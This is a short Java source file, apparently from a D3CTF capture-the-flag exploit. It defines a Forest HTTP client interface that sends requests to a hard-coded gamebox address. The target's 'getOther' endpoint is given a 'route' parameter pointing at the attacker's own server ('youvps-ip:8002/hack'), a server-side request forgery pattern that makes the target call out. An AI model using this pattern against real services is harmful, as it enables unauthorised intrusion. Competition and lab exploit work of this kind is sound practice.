package com.d3ctf.exp.request;


import com.dtflys.forest.annotation.BaseRequest;
import com.dtflys.forest.annotation.Get;
import com.dtflys.forest.annotation.Var;
import com.dtflys.forest.http.ForestResponse;

@BaseRequest(
        // replace it r to gamebox address
        baseURL = "http://106.14.150.105:30890"
//        baseURL = "http://localhost:8001"
)
public interface ExpRequest {
    @Get("/getOther?route=http://youvps-ip:8002/hack?i={i}")
    ForestResponse hack(@Var("i") int i);
}
